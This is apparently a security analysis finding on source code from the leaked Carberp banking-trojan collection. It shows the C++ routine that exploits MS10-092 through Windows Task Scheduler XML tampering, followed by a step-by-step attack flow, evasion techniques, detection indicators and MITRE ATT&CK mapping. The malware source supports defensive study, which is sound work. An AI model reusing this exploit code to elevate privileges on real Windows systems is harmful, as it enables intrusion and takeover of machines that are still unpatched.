# Finding 9: Carberp MS10-092 Exploit - Task Scheduler UAC Bypass

## Metadata
- **Repository**: Malware-Collection-master
- **File Path**: `Carberp Botnet/source - absource/pro/all source/BJWJ/source/exploit/ms10_092/ms10_092.cpp`
- **Language**: C++
- **Malware Family**: Carberp Botnet (Banking Trojan)
- **Exploit**: MS10-092 (CVE-2010-3338)

## Code Snippet

```cpp
Hr = (HRESULT)pCoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,0,NULL);
if (SUCCEEDED(Hr))
{
    ITaskService *Service = NULL;

    Hr = (HRESULT)pCoCreateInstance(&CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,&IID_ITaskService,(PVOID*)&Service);  
    if (SUCCEEDED(Hr))
    {
        Hr = Service->Connect(_variant_t(),_variant_t(),_variant_t(),_variant_t());

        if (SUCCEEDED(Hr))
        {
            ITaskFolder *RootFolder;

            Hr = Service->GetFolder(BSTR(L"\\"),&RootFolder);
            if (SUCCEEDED(Hr))
            {
                // *** GENERATE UNIQUE TASK FILE PATH ***
                wstring wszTaskPath;
                wszTaskPath.Format(L"\\\\?\\GlobalRoot\\SystemRoot\\System32\\Tasks\\%x", GetTickCount()^GetCurrentProcessId()); 

                LPWSTR wszTaskName = (LPWSTR)pPathFindFileNameW(wszTaskPath.t_str());
                RootFolder->DeleteTask(BSTR(wszTaskName),0);

                ITaskDefinition *pTask;
            
                Hr = Service->NewTask(0,&pTask);
                if (SUCCEEDED(Hr))
                {
                    IActionCollection *pActionCollection;

                    Hr = pTask->get_Actions(&pActionCollection);
                    if (SUCCEEDED(Hr))
                    {
                        IAction *pAction = NULL;

                        Hr = pActionCollection->Create(TASK_ACTION_EXEC,&pAction);
                        if (SUCCEEDED(Hr))
                        {
                            IExecAction *pExecAction;

                            Hr = pAction->QueryInterface(IID_IExecAction,(PVOID*)&pExecAction);
                            if (SUCCEEDED(Hr))
                            {
                                // *** INITIAL BENIGN PAYLOAD ***
                                Hr = pExecAction->put_Path(BSTR(L"cmd.exe"));
                                if (SUCCEEDED(Hr))
                                {
                                    Hr = pExecAction->put_Arguments(BSTR(L""));
                                    if (SUCCEEDED(Hr))
                                    {
                                        IRegisteredTask *RegisteredTask;
                                        
                                        // *** REGISTER TASK ***
                                        Hr = RootFolder->RegisterTaskDefinition(
                                            BSTR(wszTaskName),
                                            pTask,
                                            TASK_CREATE_OR_UPDATE,
                                            _variant_t(),
                                            _variant_t(),
                                            TASK_LOGON_INTERACTIVE_TOKEN,
                                            _variant_t(L""),
                                            &RegisteredTask
                                        );
                                        
                                        if (SUCCEEDED(Hr))
                                        {
                                            // *** EXPLOIT: MODIFY TASK XML FILE DIRECTLY ***
                                            if (BypassUACTaskSchChangeXML(wszTaskPath.t_str(),lpPath))
                                            {
                                                // Toggle task to reload modified XML
                                                Hr = RegisteredTask->put_Enabled(VARIANT_FALSE);
                                                if (SUCCEEDED(Hr))                      
                                                {
                                                    Hr = RegisteredTask->put_Enabled(VARIANT_TRUE);
                                                    if (SUCCEEDED(Hr)) 
                                                    {
                                                        VARIANT vr = {0};
                                                        vr.vt = VT_EMPTY;                                  
                                                        
                                                        // *** EXECUTE MALICIOUS PAYLOAD ***
                                                        Hr = RegisteredTask->Run(vr,NULL);
                                                        if (SUCCEEDED(Hr)) 
                                                        {
                                                            bRet = TRUE;
                                                        }
                                                    }
                                                }			
                                            }

                                            RegisteredTask->Release();
                                        }
                                    }
                                }
                                    
                                pExecAction->Release();
                            }

                            pAction->Release();
                        }

                        pActionCollection->Release();
                    }

                    pTask->Release();
                }

                RootFolder->Release();
            }
        }

        Service->Release();
    }
}
```

## Analysis

**What it does:**
This code implements a UAC bypass exploit (MS10-092) using the Windows Task Scheduler. The exploit creates a scheduled task with a benign payload (cmd.exe), then directly modifies the task's XML file in `C:\Windows\System32\Tasks\` to replace it with a malicious payload. By toggling the task's enabled state, the modified XML is reloaded and executed with elevated privileges without triggering UAC.

**How it uses Windows Scheduled Tasks (T1053.005):**

**Phase 1 - Benign Task Creation:**
1. Creates Task Scheduler COM instance
2. Generates random task name: `%x` (based on GetTickCount() ^ PID)
3. Creates task with `cmd.exe` as payload
4. Registers task in root folder with `TASK_LOGON_INTERACTIVE_TOKEN`
5. Task file created at: `\\?\GlobalRoot\SystemRoot\System32\Tasks\[random]`

**Phase 2 - Exploit Execution:**
1. Calls `BypassUACTaskSchChangeXML()` to directly modify XML file
2. Replaces `cmd.exe` with attacker-controlled payload path (`lpPath`)
3. Toggles task state: Disable → Enable (forces XML reload)
4. Executes modified task via `RegisteredTask->Run()`
5. Malicious payload runs with elevated privileges

**Vulnerability Exploited (MS10-092 / CVE-2010-3338):**
- **Description**: Windows Task Scheduler doesn't properly verify file permissions when loading task XML
- **Impact**: Allows unprivileged users to modify task definitions and execute code with SYSTEM privileges
- **Affected**: Windows Vista, Windows 7, Windows Server 2008/2008 R2 (pre-patch)
- **Patched**: October 2010 Security Bulletin MS10-092

**Evasion/Stealth Techniques:**
1. **Random naming**: Task name based on `GetTickCount() XOR ProcessID` - appears unique and non-suspicious
2. **Direct file access**: Uses `\\?\GlobalRoot\` path to bypass some security checks
3. **XML manipulation**: Modifies task file directly rather than through API (pre-patch vulnerability)
4. **Benign initial payload**: Creates task with `cmd.exe` to avoid suspicion during creation
5. **State toggle trick**: Disable/Enable forces reload without recreating task
6. **Immediate execution**: Runs task immediately after modification via `Run()` method
7. **Cleanup-ready**: Uses temporary task name for easy deletion after execution

**Attack Flow:**
```
1. Create benign task (cmd.exe) via COM API
   ↓
2. Task XML written to C:\Windows\System32\Tasks\[random]
   ↓
3. Exploit: Directly modify XML file (bypass ACL checks)
   ↓
4. Replace <Command>cmd.exe</Command> with malicious path
   ↓
5. Disable then re-enable task (reload modified XML)
   ↓
6. Execute task → Malicious payload runs elevated
```

**Why This Works (Pre-Patch):**
- Task Scheduler service runs as SYSTEM
- Service doesn't verify file integrity after initial creation
- XML files in System32\Tasks\ could be modified by unprivileged users
- Toggling enabled state reloads XML without permission re-check
- Task executes with original creation privileges (elevated)

**Modern Detection:**
Even though patched, this technique demonstrates:
- Direct Task XML file modification
- Unusual task creation patterns (random names)
- Immediate execution after creation
- Use of GlobalRoot path

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary)
- **T1068**: Exploitation for Privilege Escalation (MS10-092)
- **T1548.002**: Abuse Elevation Control Mechanism: Bypass User Account Control
- **T1106**: Native API (COM API usage)
- **T1222.001**: File and Directory Permissions Modification (XML tampering)
- **T1070.004**: Indicator Removal on Host: File Deletion (task cleanup)
